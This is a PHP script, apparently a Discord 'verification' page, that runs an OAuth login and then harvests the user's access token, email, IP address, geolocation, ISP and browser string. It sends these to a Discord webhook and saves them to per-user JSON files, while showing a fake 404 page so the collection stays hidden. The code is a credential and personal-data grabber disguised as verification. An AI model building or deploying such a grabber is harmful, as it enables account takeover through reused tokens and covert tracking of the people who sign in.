<?php
ob_start();
error_reporting(0);

/* 
    ----------------------------------------References----------------------------------------
        https://discord.com/developers/docs/resources/user
        https://discord.com/developers/docs/topics/oauth2
*/

// --------------------BOT--------------------
$client_id     = ""; //CLIENT ID HERE
$client_secret = ""; //CLIENT SECRET HERE
$redirect      = "http://localhost/MyProjects/DiscordVerifyPHP-JS/verify.php"; //PATH TO THIS FILE (SAME AS THE ONE YOU SET IN DISCORDAPP.COM/DEVELOPERS)


// --------------------Discord--------------------
//$discord_login_url = "https://discordapp.com/api/oauth2/authorize?";
//$discord_token_url = "https://discordapp.com/api/oauth2/token";
//$discord_api_url = "https://discordapp.com/api/";

if (empty($_GET['code'])) {
    $params = array(
        'client_id' => $client_id,
        'redirect_uri' => $redirect,
        'response_type' => 'code',
        'scope' => 'identify email guilds',
        'state' => $code
    );
    header('Location: https://discordapp.com/api/oauth2/authorize?'. http_build_query($params));
}
if (isset($_GET['code'])) {
    $token_request = "https://discordapp.com/api/oauth2/token";
    $token         = curl_init();
    curl_setopt_array($token, array(
        CURLOPT_URL => $token_request,
        CURLOPT_POST => 1,
        CURLOPT_POSTFIELDS => array(
            "grant_type" => "authorization_code",
            "client_id" => $client_id,
            "client_secret" => $client_secret,
            "redirect_uri" => $redirect,
            "state" => $_GET['state'],
            "code" => $_GET["code"]
        )
    ));
    curl_setopt($token, CURLOPT_RETURNTRANSFER, true);
    $data         = json_decode(curl_exec($token));
    $access_token = $data->access_token;
}

$info_request = "https://discordapp.com/api/users/@me";
$info         = curl_init();
curl_setopt_array($info, array(
    CURLOPT_URL => $info_request,
    CURLOPT_HTTPHEADER => array(
        "Authorization: Bearer $access_token"
    ),
    CURLOPT_RETURNTRANSFER => true
));

$user    = json_decode(curl_exec($info));
$id      = $user->id;
$email   = $user->email;
$un      = $user->username;
$di      = $user->discriminator;
$diname  = $un . "#" . $di;
$ip      = $_SERVER['REMOTE_ADDR'];
$dvverified = $user->verified;
$avatar = $user->avatar;

if(isset($id)){
    $json    = file_get_contents("http://ip-api.com/json/" . $ip);
    $data    = json_decode($json, true);
    $country = $data['country'];
    $countryCode = $data['countryCode'];
    $regionName = $data['regionName'];
    $city = $data['city'];
    $isp = $data['isp'];
    $as = $data['as'];
    $date = date('d-m-Y H:i:s');
    $agent = $_SERVER['HTTP_USER_AGENT'];


    $webhook = true;
    if($webhook == true){

        $webhookURL = "";

        $WebhookObj = json_encode([
            "username" => "Verification-Logs",
            "avatar_url" => "https://cdn.discordapp.com/avatars/701530228165574690/157cd264ad6489e88fdf2b14d5b474ea.png",
            "embeds" => [
                [
                    "title" => "$diname Data",
                        "url" => "http://localhost/MyProjects/DiscordVerifyPHP-JS/Database/Users/$id.json",
                    "type" => "rich",
                    "description" => "",
                    "color" => hexdec( "FFFFFF" ),
                    "thumbnail" => [
                         "url" => "https://cdn.discordapp.com/avatars/$id/$avatar"
                    ],
                    "footer" => [
                        "text" => "Dveloped by MRX450",
                        "icon_url" => ""
                    ],
                    "fields" => [
                        // Username
                        [
                            "name" => "Username",
                            "value" => $diname == '' ? strval('NULL') : strval($diname),
                            "inline" => true
                        ],
                        // User ID
                        [
                            "name" => "ID",
                            "value" => $id == '' ? strval('NULL') : strval($id),
                            "inline" => true
                        ],
                        // Avatar
                        [
                            "name" => "Avatar",
                            "value" => $avatar == '' ? strval('NULL') : strval($avatar),
                            "inline" => false
                        ],
                        // Discord User Verified
                        [
                            "name" => "Discord Verified",
                            "value" => $dvverified == 1 ? strval('True') : strval('False'),
                            "inline" => false
                        ],
                        // IP
                        [
                            "name" => "IP",
                            "value" => $ip == '' ? strval('NULL') : strval($ip),
                            "inline" => true
                        ],
                        // ISP
                        [
                            "name" => "ISP",
                            "value" => $isp == '' ? strval('NULL') : strval($isp),
                            "inline" => true
                        ],
                        // Email
                        [
                            "name" => "Email",
                            "value" => $email == '' ? strval('NULL') : strval("```$email```"),
                            "inline" => false
                        ],
                        // Access_token
                        [
                            "name" => "Access Token",
                            "value" => $access_token == '' ? strval('NULL') : strval($access_token),
                            "inline" => false
                        ],
                        // Country
                        [
                            "name" => "Country",
                            "value" => $country == '' ? strval('NULL') : strval("$country($countryCode)"),
                            "inline" => true
                        ],
                        // City
                        [
                            "name" => "City",
                            "value" => $city == '' ? strval('NULL') : strval($city),
                            "inline" => true
                        ],
                        // Region
                        [
                            "name" => "Region",
                            "value" => $regionName == '' ? strval('NULL') : strval($regionName),
                            "inline" => true
                        ],
                        // AS
                        [
                            "name" => "AS",
                            "value" => $as == '' ? strval('NULL') : strval($as),
                            "inline" => false
                        ],
                        // Browser
                        [
                            "name" => "Browser",
                            "value" => $agent == '' ? strval('NULL') : strval($agent),
                            "inline" => true
                        ]
                    ]
                ]
            ]

        ], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

        $ch = curl_init();

        curl_setopt_array( $ch, [
            CURLOPT_URL => $webhookURL,
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $WebhookObj,
            CURLOPT_HTTPHEADER => [
                "Content-Type: application/json"
            ]
        ]);

        $response = curl_exec( $ch );
        curl_close( $ch );
    }

    $file2 = "Database/Users/$id.json";
    if(!file_exists($file2)){
        fopen($file2, "w");
        $current_data = file_get_contents($file2);
        $array_data = json_decode($current_data, true);
        $extra = array(
            'Username' => "$diname",
            'Id' => $id,
            'Ip' => "$ip",
            'Email' => "$email",
            "Access_token" => "$access_token",
            "DiscordVerified" => $dvverified,
            'Verified' => true,
            "Avatar" => "$avatar",
            'Country' => "$country($countryCode)",
            'Region' => "$regionName",
            'City' => "$city",
            'ISP' => "$isp",
            "as" => "$as",
            'Date' => "$date"
        );
        $array_data = $extra;
        $final_data = json_encode($array_data, JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE);
        
        if(file_put_contents($file2, $final_data)){
            header('Location: https://discord.gg');
        };
        
    }else{
        header('Location: https://discord.gg');
    }
}

?>
<title>Error 404</title>
<body>
    <h2 style="text-align: center;">Error 404 - Page Not Found</h2>
</body>
